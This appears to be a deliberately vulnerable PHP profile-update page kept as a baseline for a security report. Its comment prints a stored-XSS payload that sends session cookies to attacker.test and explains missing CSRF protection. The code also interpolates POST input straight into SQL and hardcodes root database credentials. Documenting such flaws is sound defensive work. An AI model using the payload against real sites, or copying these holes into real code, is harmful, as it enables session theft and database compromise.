<?php
/**
 * VULNERABLE BASELINE -- FOR REPORT COMPARISON ONLY. Not routed.
 * Finding: Stored XSS. The bio field is rendered without encoding,
 * so a bio value of  <script>document.location='https://attacker.test/c?'+document.cookie</script>
 * executes for every user who views this profile page (including an
 * admin), enabling session-cookie theft.
 *
 * Also demonstrates CSRF: the update form below has no anti-CSRF
 * token, so a forged form on another site can submit a profile
 * change (or, in the enrolment page, an enrolment) using the
 * victim's authenticated session automatically.
 */
session_start();
$user = /* ...load current user... */ [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABLE: no CSRF token check at all.
    $conn = new mysqli('127.0.0.1', 'root', 'root', 'student_registration');
    $conn->query("UPDATE users SET bio = '{$_POST['bio']}' WHERE id = {$_SESSION['user_id']}");
}
?>
<!-- VULNERABLE: raw output, no htmlspecialchars() -->
<div class="bio"><?php echo $user['bio']; ?></div>
<form method="post">
    <textarea name="bio"><?php echo $user['bio']; ?></textarea>
    <button type="submit">Save</button>
</form>
